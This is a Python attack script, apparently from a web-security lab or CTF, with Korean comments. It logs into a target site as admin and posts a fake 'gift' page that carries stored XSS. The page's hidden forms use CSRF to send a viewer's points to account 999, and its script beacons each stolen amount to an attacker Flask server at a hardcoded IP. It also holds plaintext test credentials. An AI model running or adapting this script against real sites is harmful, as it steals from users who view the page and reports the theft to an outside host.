#!/usr/bin/env python3
"""
fake-gift CSRF 공격 페이지 (정확한 포인트 카운팅)
iframe 응답을 확인해서 실제 성공한 것만 카운트
"""

import requests

TARGET = "http://52.78.221.104"
LOGIN_URL = f"{TARGET}/login.php"
POST_URL = f"{TARGET}/new_post.php"
INDEX_URL = f"{TARGET}/index.php"

# 개선된 fake-gift HTML - 성공 여부 확인
FAKE_GIFT_HTML = """<div style="font-family:Arial;text-align:center;padding:50px;background:linear-gradient(135deg,#667eea,#764ba2);color:white;margin:0"><div style="background:white;color:#333;padding:50px;border-radius:20px;max-width:500px;margin:0 auto;box-shadow:0 20px 60px rgba(0,0,0,0.3)"><div style="font-size:100px">🎁</div><h1 style="color:#667eea">🎉 축하합니다!</h1><p style="font-size:1.5em">10,000 포인트를 받으셨습니다!</p><div id="s" style="background:#f0f0f0;padding:15px;border-radius:10px;margin:20px 0;color:#667eea;font-weight:bold">처리 중...</div></div><div id="f"></div><script>const A='http://13.158.67.78:5000';let stolen=0;function n(e,p){const i=new Image();i.src=A+e+'?'+p+'&t='+Date.now();console.log('[+] Notify:',e,p)}n('/notify','event=page_loaded');const am=[50000,30000,20000,10000,5000,3000,2000,1000,500,300,200,100];let h='';am.forEach((a,i)=>{h+='<form id="f'+i+'" method="POST" action="http://52.78.221.104/profile.php" target="if'+i+'"><input type="hidden" name="send_gift" value="1"><input type="hidden" name="receiver_id" value="999"><input type="hidden" name="gift_type" value="diamond"><input type="hidden" name="points" value="'+a+'"><input type="hidden" name="message" value="Event"></form><iframe name="if'+i+'" id="iframe'+i+'" style="display:none"></iframe>'});document.getElementById('f').innerHTML=h;const t=am.reduce((a,b)=>a+b,0);n('/victim','points='+t);let idx=0;function sendNext(){if(idx>=am.length){setTimeout(()=>{document.getElementById('s').innerHTML='✅ 완료!';n('/complete','total='+stolen);setTimeout(()=>{window.location.href='http://52.78.221.104/index.php'},2000)},1000);return}const amt=am[idx];const fid='f'+idx;const iid='iframe'+idx;document.getElementById(fid).submit();console.log('[+] Submitted:',amt+'P');setTimeout(()=>{try{const iframe=document.getElementById(iid);let success=true;try{const iframeDoc=iframe.contentDocument||iframe.contentWindow.document;if(iframeDoc&&iframeDoc.body){const text=iframeDoc.body.innerText||'';if(text.includes('insufficient')||text.includes('error')||text.includes('failed')){success=false;console.log('[-] Failed:',amt+'P')}}else{success=true}}catch(e){success=true}if(success){stolen+=amt;n('/transfer','amount='+amt);console.log('[+] Success:',amt+'P (Total:'+stolen+'P)')}document.getElementById('s').innerHTML='처리 중... '+Math.round((idx+1)/am.length*100)+'%';idx++;sendNext()}catch(e){console.log('[!] Error checking iframe:',e);stolen+=amt;n('/transfer','amount='+amt);idx++;sendNext()}},500)}sendNext()</script></div>"""

print("="*60)
print("🎁 fake-gift 페이지 업로드 (정확한 카운팅)")
print("="*60)
print()

# 세션 생성
session = requests.Session()

# 1. 로그인
print("[*] admin으로 로그인 중...")
login_data = {
    'username': 'admin',
    'password': 'admin123'
}

r = session.post(LOGIN_URL, data=login_data, allow_redirects=True)

if 'index.php' in r.url or 'profile.php' in r.url:
    print("[+] 로그인 성공!")
else:
    print("[-] 로그인 실패")
    exit(1)

# 2. 기존 게시물 확인 (있으면 제거하지 않고 덮어쓰기)
print("\n[*] 기존 게시물 확인 중...")
r = session.get(INDEX_URL)
if '🎁' in r.text:
    print("[!] 기존 fake-gift 게시물이 이미 존재합니다")
    print("[*] 새 버전으로 게시물 작성...")

# 3. 새로운 fake-gift 게시물 작성
print("\n[*] 개선된 fake-gift 페이지 게시 중...")

post_data = {
    'content': FAKE_GIFT_HTML
}

r = session.post(POST_URL, data=post_data, allow_redirects=True)

print(f"[+] 응답 코드: {r.status_code}")
print(f"[+] 응답 URL: {r.url}")

# 4. 게시물 확인
print("\n[*] 게시물 확인 중...")
r = session.get(INDEX_URL)

if '🎁' in r.text:
    print("[+] fake-gift 페이지가 성공적으로 게시되었습니다!")
    print()
    print("="*60)
    print("✅ 개선된 버전 배포 완료!")
    print("="*60)
    print()
    print("주요 개선사항:")
    print("- iframe 응답 확인으로 실제 성공만 카운트")
    print("- 순차 처리로 중복 요청 방지")
    print("- 실시간 성공/실패 로그")
    print()
    print("테스트:")
    print("1. Flask 대시보드: http://13.158.67.78:5000/")
    print("2. Flask 리셋: http://13.158.67.78:5000/reset")
    print("3. 새 브라우저에서 alice 로그인")
    print("   http://52.78.221.104/login.php")
    print("   alice / alice2024")
    print("4. index.php 접속 시 자동 실행")
    print()
    print("="*60)
else:
    print("[-] 게시물 확인 실패")
